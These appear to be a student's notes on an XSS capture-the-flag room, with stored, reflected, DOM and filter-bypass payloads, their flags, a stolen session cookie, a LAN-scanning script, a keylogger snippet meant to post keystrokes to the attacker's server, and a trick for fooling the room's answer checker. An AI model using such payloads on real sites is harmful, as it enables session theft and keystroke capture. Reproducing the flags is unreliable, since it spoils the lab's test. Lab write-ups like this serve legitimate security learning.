@@ -1,0 +1,215 @@
+
+
+Cross Site Scripting 
+=====================
+
+This is gonna be a long night... Getting on with it.
+
+- It's a type of vulnerability which allows an attacker to execute malicious script on host's machine.
+	- Generally happens when user input is not sanitized.
+
+The severity depends on type of XSS (Generally, stored and reflective). XSS can cause the following attacks:
+
+	- Cookie Stealing
+	- Keylogging - Logs and sends logged passwords to their own server.
+	- Webcam snapshot
+	- Phishing
+	- Port Scanning
+	- Other browser based exploits - Millions of them.
+
+If you want to take a real life perspective on XSS, the answer is BeEF.
+
+Note: Remember those days when you started as a black hat hacker, and started using plugins in beef, guess what, they exploited a type of XSS (prolly DOM(will read ahead) but everything was so simplified with it's plugins)
+
+Stored XSS
+===========
+
+- The most deadliet type of XSS. This is where a malicious code is executed at database level. 
+	- This is where when user input goes directly to database, without any sanitation.
+
+How this works?
+
+An attacker while signing up on a website sends a malicious payload that goes and stores into the database.
+	- Now, when the site loads that particular field on which the user has applied XSS, the website will execute that particular payload attached to the field as well.
+
+Practical
+----------
+
+	Add a comment and see if you can insert some of your own HTML.
+		Payload: <pre>Myself belikeParamjot</pre>
+		Flag: HTML_T4gs
+
+	Create an alert popup box appear on the page with your document cookies.
+		Payload: <script>alert(document.cookies);</script>
+		Flag: W3LL_D0N3_LVL2s
+
+	Change "XSS Playground" to "I am a hacker" by adding comments and using Javascript.
+		Payload: document.querySelector('thm-title').innerHTML="I am a hacker"; (And then reload the page)
+		Flag: websites_can_be_easily_defaced_with_xss
+
+Note: Even if you do learn about XSS you need to learn javascript to know how to execute code... Because I found 3 variation on the payload, that did the same thing... But got flag only with the last one...
+
+	Other 2: 
+	document.getElementById('thm-title').innerHTML="I am a hacker";
+	document.getElementById('thm-title').textContent="I am a hacker";
+
+	Take over Jack's account by stealing his cookie, what was his cookie value?
+		Payload: <img src="javascript:'/log/' + document.cookie" />
+		Cookie: s%3Aat0YYHmITnfNSF0kM5Ne-ir1skTX3aEU.yj1%2FXoaxe7cCjUYmfgQpW3o5wP3O8Ae7YNHnHPJIasE
+
+This task made me deploy my target machine about 2 times... When I saw the writeup... It gave a little bit of sense to me... That let's use img tag and not chnage the windows locatioin, else everytime I go there and try to move to /stored directory it redirects me to somewhere I don't want to... 
+
+	Post a comment as Jack.
+	Payload: Change the cookie with cookie editor
+	Flag: c00ki3_stealing_
+
+Javascript is a must for XSS
+
+Reflected XSS
+==============
+
+- It is a type of XSS where XSS is not stored into the database, instead to execute this type of XSS, the payload needs to be send with every request... 
+	- An attacker needs to trick a user, to go to a particular URL in order to execute the reflective payload.
+
+Note: The rest of the javascript files, need not to be loaded for this to execute
+
+- It might seem harmless, but in real life can hack user's of a website which is again, what a site admin would be trying to protected.
+
+How this works?
+
+An attacker sends the malicious crafted URL to the victim, when the victim uses that URL to get into a site, the webserver then uses that payload in the response, response gets executed in the browser and may be used to redirect the user infomration(cookie, password, sessionid/tokenid) to either attacker... or attacker may redirect to another website in his control...
+	- This protects the attacker from directly receiving the victim's data #Anonymous
+
+Practical
+-----------	
+
+	Craft a reflected XSS payload that will cause a popup saying "Hello"
+		Payload: <script>alert('Hello')</script>
+		Flag: ThereIsMoreToXSSThanYouThink
+
+
+
+	Craft a reflected XSS payload that will cause a popup with your machines IP address.
+		Payload: <script>alert(window.location.hostname)</script>
+		Flag: ReflectiveXss4TheWin
+
+DOM Based XSS
+==============
+
+- DOM based XSS is not possible via remotely, this is the least severe vulnerability, I don't know how this is even vulnerability because whatever happens... happens under the DOM i.e. locally on a target's machine, and it doesn't seem to be an attack to me...
+
+- DOM based XSS is caused by logical flaws in the javascript, THAT IS ALREADY LOADED ONTO THE SITE.
+	- This is like editing an element in developer console to work your site accordingly, the only difference is, you have to work smartly, with make something up with the input fields and incomplete codes... It's like, manipulating javascript via html elements and input fields.
+DOM - Document Object Model. One way to exploit this is... You have a browser payload present inside the victim's browser... And when the user goes to the site vulnerable to DOM based XSS the browser will execute the code to exploit DOM.
+
+Why should this concern the owner of the website?
+	First of all, do not forget that there can be multiple vulnerabilities in a site... So if the attacker found a CSRF vulnerability on the same site too, he might use the DOM XSS on his machine to further exploit CSRF. Or boost results for other vulnerabilities...
+		- Besides, if a user has a way of redirecting his cookie and important tokens via a normal DOM based XSS... Even if its DOM, the site is vulnerable and it should be fixed, also javascript can be used to do prety much nasty things, so DOM can be crafted into a payload and sent to the user. N no. of possibilities are there.
+
+Note: If still not able to get the point, DO SOME HANDS-ON activity. Best source: portswigger dom based xss labs.
+
+Practical
+-----------
+
+1. So I crafted my own payload for DOM XSS... The only thing was, I didn't encode it under strings.
+
+	Look at the deployed machines DOM-Based XSS page source code, and figure out a way to exploit it by executing an alert with your cookies.
+		Payload: 1" onclick="alert(document.cookie)
+		Flag: BreakingAnElementsTag
+
+2. The second one I did on my own, a little bit of javascript research and got my answer.
+	Create an onhover event on an image tag, that change the background color of the website to red.
+		Payload: 1" onmouseover="document.body.style.backgroundColor='red';"
+		Flag: JavascriptIsAwesome
+
+Port scanning and IP scanning with XSS
+----------------------------------------
+
+Code:
+
+<script>
+	for (let i = 0; i < 256; i++) {
+  let ip = '192.168.0.' + i
+
+  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
+  document.body.innerHTML += code 
+	}
+</script>
+
+I will leave the rest upto you to understand this code... 
+
+For port scanning just add port iterations on the active IP.
+
+Note: the IP addresses will only be shown active only if they have a web server running, on port 80... Read the code above... 
+
+Keylogging
+------------
+
+<script type="text/javascript">
+	let l = ""; // Variable to store key-strokes in l document.onkeypress = function (e) { // Event to listen for key presses
+	l += e.key; // If user types, log it to the l variable
+	console.log(l); // update this line to post to your own server
+	}
+</script> 
+
+
+Read the code above, and modify it according to your own needs
+
+Filter Bypassing
+-----------------
+
+This one was tough... Like literally, I didn't know much of javascript functions plus, I am lagging critical thinking right now at 3 am. So tried to bypass the filter just by changing cases...
+
+But later when I checked the writeup I saw that this was something on another level.
+
+Are you able to bypass the filter that removes any script tags.
+	Payload: <img src=x onerror=alert('Hello');>
+	Flag: 3c3cf8d90aaece81710ab9db759352c0
+
+Are you able to bypass the filter that removes any alert tags.
+	Payload: 0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"
+	Flag: a2e5ef66f5ff584a01d734ef5edaae91
+
+Hello string is being filtered in the output.
+	Payload: <img src="blah" onerror=alert("HHelloello") />
+	Flag: decba45d0eff17c6eedf1629393bee1d
+
+Note: note that HHelloello string in the alert(contains 'Hello' after first H... and then followed by 'ello'). This being said, the filter will replace the occurence of hello with "", and then what will be left is another "Hello" complete string... Genius.
+
+Following are filtered:
+	word “Hello”
+    script
+    onerror
+    onsubmit
+    onload
+    onmouseover
+    onfocus
+    onmouseout
+    onkeypress
+    onchange
+
+Payload: <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>
+Flag: 2482d2e8939fc85a9363617782270555
+
+Now, I ain't trying to understand what those payloads do(except 3)... Because that's waste of time... So let it be, will be back on it when have a little more knowledge on javascript.
+
+Note: Their is a flaw in the room... This section is all being evaluated by POSTing values for question and answer to /filter-evasion-check. If you simply POST question=1&answer=Hello to /filter-evasion-check, you can fool the server-side code into returning the valid answer flag. Use curl on them for ease working out things.
+
+Protection methods and other exploits
+======================================
+
+This is not important to know from an attacker's perspective... But still I am gonna copy paste the important things here.
+
+There are many ways to prevent XSS, here are the 3 ways to keep cross-site scripting our of your application.
+
+    Escaping - Escape all user input. This means any data your application has received  is secure before rendering it for your end users. By escaping user input, key characters in the data received bu the web age will be prevented from being interpreter in any malicious way. For example, you could disallow the < and > characters from being rendered.
+
+    Validating Input - This is the process of ensuring your application is rendering the correct data and preventing malicious data from doing harm to your site, database and users. Input validation is disallowing certain characters from being submit in the first place.
+
+    Sanitising - Lastly, sanitizing data is a strong defence but should not be used to battle XSS attacks alone. Sanitizing user input is especially helpful on sites that allow HTML markup, changing the unacceptable user input into an acceptable format. For example you could sanitise the < character into the HTML entity &#60;
+
+Now there is mention of BeEF framework to automate the XSS exploitation... But we don't need to exploit using XSS, our work is generally limited to finding the vulnerability. Whatever the case, you already know beef so leave it be.
+
+Checkout www.xss-payloads.com 
+
+Note: the www, seems like their are no A records set for this domain... (Only CNAME) so make sure to visit www.xss-payloads.com
